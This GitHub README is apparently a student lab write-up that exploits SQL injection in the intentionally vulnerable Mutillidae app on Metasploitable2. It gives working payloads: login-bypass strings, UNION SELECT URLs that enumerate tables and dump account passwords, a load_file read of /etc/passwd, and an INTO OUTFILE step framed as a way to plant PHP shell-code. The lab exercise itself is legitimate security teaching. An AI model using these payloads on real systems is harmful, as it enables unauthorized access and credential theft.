# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![output1 (1)](https://github.com/viswapriyaG/sqlinjection/assets/131427787/34ef7c82-d32e-4549-86ef-e377b4ab7032)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![output2](https://github.com/viswapriyaG/sqlinjection/assets/131427787/340a56b1-1942-49eb-b6fd-d6935c294f24)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![output3](https://github.com/viswapriyaG/sqlinjection/assets/131427787/267759c4-27eb-4f2f-bb2c-4dfae4b9027f)

Click on the menu Login/Register and register for an account
![output4](https://github.com/viswapriyaG/sqlinjection/assets/131427787/5fe16d4e-5de6-42aa-97b5-6df39cf261eb)

Click on the link “Please register here”
![output5](https://github.com/viswapriyaG/sqlinjection/assets/131427787/1fbd4764-0aac-410b-ac37-15f18e47cf58)

Click on “Create Account” to display the following page:
![output6](https://github.com/viswapriyaG/sqlinjection/assets/131427787/9039bcf9-35cb-4b9b-8b0b-56d66c047ef3)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![output7 (1)](https://github.com/viswapriyaG/sqlinjection/assets/131427787/9cd99c9a-804d-4419-bfac-94e57843b62f)


Click “Login”. The logged in page will show as below:
![output8](https://github.com/viswapriyaG/sqlinjection/assets/131427787/f43f4ba2-0d21-4a28-985e-d6aa7a3d96e9)


##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![output9 (1)](https://github.com/viswapriyaG/sqlinjection/assets/131427787/ab6709b8-8596-4d5e-a771-95622ebb3bb0)

Click the login button and you will see it enter into the administrator page.
![output10](https://github.com/viswapriyaG/sqlinjection/assets/131427787/afc3b6f8-c94f-4a34-a64a-18fef9e4c742)


Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img
![output11 (1)](https://github.com/viswapriyaG/sqlinjection/assets/131427787/996101b2-a5e9-471f-b1c7-d78f8872023b)
![output12](https://github.com/viswapriyaG/sqlinjection/assets/131427787/1578fe27-f14e-4c5f-9f05-6ab326b76cd6)
![output13](https://github.com/viswapriyaG/sqlinjection/assets/131427787/52744f55-90be-463a-8b3c-05c366f7bb41)
![output14](https://github.com/viswapriyaG/sqlinjection/assets/131427787/9857d90e-eaf6-4f2d-99f1-fbe49bb8c2d7)
![output15](https://github.com/viswapriyaG/sqlinjection/assets/131427787/57251a92-abc3-43f0-b418-43a9150e1c2b)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 
![output16](https://github.com/viswapriyaG/sqlinjection/assets/131427787/76ea689c-360c-485f-802b-202fbcfefa28)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![output17](https://github.com/viswapriyaG/sqlinjection/assets/131427787/e757d11d-2658-4773-9771-50a01eb7f80b)

After adding the order by 6 into the existing url , the following error statement will be obtained:

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![output18](https://github.com/viswapriyaG/sqlinjection/assets/131427787/d9446502-4943-4984-9eb4-e139caf3c16b)

As it is having 5 columns the query worked fine and it provides the correct result
![output19](https://github.com/viswapriyaG/sqlinjection/assets/131427787/1853f829-d456-433d-8fa4-41844f1c44bb)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![output20](https://github.com/viswapriyaG/sqlinjection/assets/131427787/d12f491d-6e31-40e9-94a1-ef699d571d13)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![output21](https://github.com/viswapriyaG/sqlinjection/assets/131427787/bbfd0b4f-9038-4d54-9f56-caaffd5b0ee8)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![output22](https://github.com/viswapriyaG/sqlinjection/assets/131427787/5ed39a73-313e-4705-a4d6-6f4bb2f1c743)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![output23](https://github.com/viswapriyaG/sqlinjection/assets/131427787/2e4a2a23-2249-442f-9053-55626fbbd05f)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![output24](https://github.com/viswapriyaG/sqlinjection/assets/131427787/a0623f68-b0e1-4864-9704-a69989baaf76)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![output25](https://github.com/viswapriyaG/sqlinjection/assets/131427787/fbb65e3c-087c-4006-8056-1ebb7f83fc77)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![output26](https://github.com/viswapriyaG/sqlinjection/assets/131427787/c79f2825-2fa4-42a4-87e7-81642b8a43e5)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![output27](https://github.com/viswapriyaG/sqlinjection/assets/131427787/017865c5-c5bd-4c29-bd46-1971dd27be76)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
